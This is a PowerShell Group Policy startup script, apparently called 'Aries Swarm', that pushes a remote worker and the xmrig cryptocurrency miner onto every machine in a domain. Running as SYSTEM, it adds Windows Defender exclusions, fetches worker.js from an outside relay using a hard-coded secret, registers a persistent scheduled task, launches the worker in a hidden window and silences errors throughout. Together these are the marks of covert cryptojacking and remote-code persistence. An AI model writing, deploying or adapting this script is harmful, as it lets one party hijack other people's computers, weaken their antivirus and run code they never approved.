# ============================================================================
# Aries Swarm — GPO Startup Script
# deploy/gpo-startup.ps1
#
# Deploy via Group Policy: Computer Config > Policies > Windows Settings >
# Scripts > Startup > Add this script
#
# Runs as SYSTEM on every boot. Installs worker if not present,
# updates if outdated, skips if already running.
# ============================================================================

$ErrorActionPreference = "SilentlyContinue"

# ── Config ──
$RelayUrl    = "https://gateway.doomtrader.com:9700"
$Secret      = "aries-swarm-jdw-2026"
$InstallDir  = "$env:ProgramData\aries-swarm"
$XmrigDir    = "$InstallDir\xmrig"
$LogFile     = "$InstallDir\deploy.log"
$VersionFile = "$InstallDir\.version"
$CurrentVer  = "1.0.0"

function Log($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $LogFile -Value "[$ts] $msg" -ErrorAction SilentlyContinue
}

# ── Already running? ──
$existing = Get-Process -Name "node" -ErrorAction SilentlyContinue | Where-Object {
    $_.CommandLine -like "*aries-swarm*" -or $_.CommandLine -like "*worker.js*"
}
if ($existing) {
    # Check version for updates
    if (Test-Path $VersionFile) {
        $installedVer = Get-Content $VersionFile -Raw
        if ($installedVer.Trim() -eq $CurrentVer) {
            Log "Worker already running (PID $($existing.Id)), version current. Skipping."
            exit 0
        }
        Log "Update available: $($installedVer.Trim()) -> $CurrentVer"
    } else {
        Log "Worker running but no version file. Continuing with update."
    }
}

# ── Create install directory ──
if (!(Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
    Log "Created $InstallDir"
}

# ── Defender exclusions (runs as SYSTEM = admin) ──
Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $XmrigDir -ErrorAction SilentlyContinue
Log "Defender exclusions added"

# ── Check Node.js ──
$nodeCmd = Get-Command node -ErrorAction SilentlyContinue
if (!$nodeCmd) {
    Log "Node.js not found. Installing..."
    $nodeInstaller = "$env:TEMP\node-setup.msi"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri "https://nodejs.org/dist/v20.11.0/node-v20.11.0-x64.msi" -OutFile $nodeInstaller -UseBasicParsing
        Start-Process msiexec.exe -ArgumentList "/i `"$nodeInstaller`" /qn /norestart" -Wait -NoNewWindow
        Remove-Item $nodeInstaller -ErrorAction SilentlyContinue
        # Refresh PATH
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
        Log "Node.js installed"
    } catch {
        Log "Node.js install failed: $_"
        exit 1
    }
}

# ── Download worker files ──
Log "Downloading worker files..."
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $headers = @{ "X-Aries-Secret" = $Secret }
    
    # Try fetching from relay, fall back to raw payload
    try {
        Invoke-WebRequest -Uri "$RelayUrl/worker.js" -OutFile "$InstallDir\worker.js" -Headers $headers -UseBasicParsing
        Log "Downloaded worker.js from relay"
    } catch {
        # Fallback: use embedded worker or copy from USB
        if (Test-Path "$PSScriptRoot\..\usb-swarm\worker.js") {
            Copy-Item "$PSScriptRoot\..\usb-swarm\worker.js" "$InstallDir\worker.js" -Force
            Log "Copied worker.js from usb-swarm"
        } else {
            Log "Could not download worker.js: $_"
            exit 1
        }
    }

    # Worker config
    $config = @{
        relayUrl = $RelayUrl
        secret   = $Secret
        hostname = $env:COMPUTERNAME
        workerId = "gpo-$($env:COMPUTERNAME.ToLower())"
    } | ConvertTo-Json
    Set-Content -Path "$InstallDir\env.json" -Value $config
    Log "Config written"
} catch {
    Log "Download failed: $_"
    exit 1
}

# ── Download xmrig if not present ──
if (!(Test-Path "$XmrigDir\xmrig.exe")) {
    Log "Downloading xmrig..."
    try {
        if (!(Test-Path $XmrigDir)) { New-Item -ItemType Directory -Path $XmrigDir -Force | Out-Null }
        $xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-msvc-win64.zip"
        $xmrigZip = "$env:TEMP\xmrig.zip"
        Invoke-WebRequest -Uri $xmrigUrl -OutFile $xmrigZip -UseBasicParsing
        Expand-Archive -Path $xmrigZip -DestinationPath "$env:TEMP\xmrig-extract" -Force
        Get-ChildItem "$env:TEMP\xmrig-extract" -Recurse -Filter "xmrig.exe" | Select-Object -First 1 | ForEach-Object {
            Copy-Item $_.FullName "$XmrigDir\xmrig.exe" -Force
        }
        Remove-Item $xmrigZip, "$env:TEMP\xmrig-extract" -Recurse -Force -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath "$XmrigDir\xmrig.exe" -ErrorAction SilentlyContinue
        Log "xmrig installed"
    } catch {
        Log "xmrig download failed (non-fatal): $_"
    }
}

# ── Stop old worker if updating ──
if ($existing) {
    Log "Stopping old worker for update..."
    $existing | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}

# ── Create scheduled task for persistence ──
$taskName = "AriesSwarmWorker"
$existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if (!$existingTask) {
    $action = New-ScheduledTaskAction -Execute "node" -Argument "`"$InstallDir\worker.js`"" -WorkingDirectory $InstallDir
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
    Log "Scheduled task created"
}

# ── Start worker ──
Log "Starting worker..."
Start-Process -FilePath "node" -ArgumentList "`"$InstallDir\worker.js`"" -WorkingDirectory $InstallDir -WindowStyle Hidden -PassThru | Out-Null

# ── Write version ──
Set-Content -Path $VersionFile -Value $CurrentVer

Log "Deployment complete. Worker started on $env:COMPUTERNAME"
exit 0
